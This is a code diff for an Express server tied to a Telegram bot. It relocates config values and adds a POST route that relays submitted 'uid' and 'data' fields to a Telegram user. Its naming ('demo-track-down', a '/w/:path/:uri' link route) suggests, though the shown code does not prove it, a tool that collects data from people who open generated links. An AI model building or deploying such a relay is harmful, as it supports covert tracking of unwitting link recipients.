@@ -20,15 +20,6 @@ app.set("view engine", "ejs");
 // Serve static files (if needed)
 app.use(express.static("public"));
 
-// Channel Username
-const channelUsername = "@technicalwhitehat";
-
-// Base Host URL (Modify if needed)
-const hostURL = "https://demo-track-down.onrender.com";
-
-// Toggle for Shortener
-const use1pt = false;
-
 // 📌 Start Command - Ask to Join Channel
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -280,8 +271,37 @@ app.get("/w/:path/:uri", (req, res) => {
     }
 });
 
-// 📌 Start the Express Server
-app.listen(5000, () => {
-    console.log("🚀 Bot is running on port 5000!");
+
+// 📌 Handle Data Route (Fixed to ensure message delivery)
+app.post("/", async (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const data = decodeURIComponent(req.body.data) || null;
+
+    if (uid && data) {
+        try {
+            const userId = parseInt(uid, 36);
+            const formattedData = data.replace(/<br>/g, '\n');
+            await bot.sendMessage(userId, formattedData, { 
+                parse_mode: 'HTML',
+                disable_web_page_preview: true 
+            });
+            res.send("Done");
+        } catch (error) {
+            console.error("Error sending message:", error);
+            res.status(500).send("Error");
+        }
+    } else {
+        res.status(400).send("Missing data");
+    }
 });
-        
+
+
+// 📌 Start the Express Server (Consolidated to port 3000)
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on port ${PORT}`);
+});
+
+const channelUsername = "@technicalwhitehat";
+const hostURL = "https://2faf52b2-d335-4592-889e-b924af64f47a-00-2900lv25jm7uh.sisko.replit.dev:3000/";
+const use1pt = false;
